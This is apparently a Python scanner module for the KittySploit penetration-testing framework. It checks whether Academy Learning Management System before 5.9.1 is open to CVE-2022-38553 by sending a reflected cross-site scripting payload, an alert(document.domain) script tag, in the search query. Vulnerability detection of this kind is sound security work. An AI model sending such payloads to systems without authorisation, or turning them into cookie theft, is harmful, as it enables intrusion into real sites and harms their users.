#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Academy Learning Management System before 5."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Academy Learning Management System <5.9.1 - Cross-Site Scripting Detection',
        'description': 'Academy Learning Management System before 5.9.1 contains a cross-site scripting vulnerability via the Search parameter. An attacker can inject arbitrary script in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2022', 'academylms', 'xss', 'creativeitem', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://www.youtube.com/watch?v=yFiZffHoeKs&ab_channel=4websecurity',
            'https://github.com/4websecurity/CVE-2022-38553',
            'https://codecanyon.net/item/academy-course-based-learning-management-system/22703468',
            'https://nvd.nist.gov/vuln/detail/CVE-2022-38553',
            'http://academy.com',
        ],
        'cve': 'CVE-2022-38553',
    }

    def run(self):
        r = self.http_request(method="GET", path='/search?query=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('"><script>alert(document.domain)</script>', 'Study any topic',)
        header_any = ('text/html',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='medium',
                reason="Academy Learning Management System <5.9.1 - Cross-Site Scripting detected",
                path='/search?query=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E',
            )
            return True
        return False

